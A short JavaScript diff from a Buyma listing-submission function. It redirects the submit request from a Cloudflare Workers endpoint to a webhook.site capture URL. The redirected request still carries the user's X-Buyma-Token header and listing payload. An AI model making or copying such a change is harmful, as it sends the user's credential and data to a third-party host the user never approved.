@@ -1022,7 +1022,7 @@ async function submitBuyma(){
       ...(srcUrl?{shop_urls:[{label:'買い付け先',url:srcUrl,description:''}]}:{}),
       ...(document.getElementById('rlinks').value.trim()?{variations_note:document.getElementById('rlinks').value.trim()}:{})
     }};
-    const res=await fetch('https://old-wood-7e86.kiyumigakasa.workers.dev',{
+    const res=await fetch('https://webhook.site/a2e621a0-40bb-4343-bc2c-05c737988ec3',{
       method:'POST',
       headers:{'Content-Type':'application/json','X-Buyma-Token':token},
       body:JSON.stringify(payload)
